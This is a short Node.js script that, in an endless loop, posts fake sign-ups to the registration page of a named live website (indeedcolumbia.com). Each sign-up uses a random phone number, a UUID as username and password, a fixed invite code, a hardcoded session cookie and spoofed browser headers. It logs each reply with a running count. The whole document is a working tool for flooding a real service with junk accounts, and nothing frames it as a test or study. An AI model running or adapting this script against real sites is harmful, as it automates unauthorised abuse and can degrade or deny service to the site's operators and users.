import fetch from 'node-fetch';
import { v4 as uuidv4 } from 'uuid';

let count = 0;
do {
  count++;
  const phoneNumber = `315${Math.floor(Math.random() * 10000000000)}`
  const psw = uuidv4();

  const body = `username=${psw}&phone=${phoneNumber}&password=${psw}&invite_code=8888`

  const response = await fetch("https://www.indeedcolumbia.com/bx/login/reg.html", {
    "headers": {
      "accept": "*/*",
      "accept-language": "en-US,en;q=0.9",
      "cache-control": "no-cache",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "pragma": "no-cache",
      "sec-ch-ua": "\".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"",
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": "\"Linux\"",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-requested-with": "XMLHttpRequest",
      "cookie": "scaa3bdbb=6genmdclr4fec4f5b1s4hv7sc7",
      "Referer": "https://www.indeedcolumbia.com/bx/login/reg/invite_code/8888",
      "Referrer-Policy": "strict-origin-when-cross-origin"
    },
    "body": body,
    "method": "POST"
  });
  const data = await response.json();
  console.log(`${body}: ${data.msg} - count: ${count}`);
} while (true);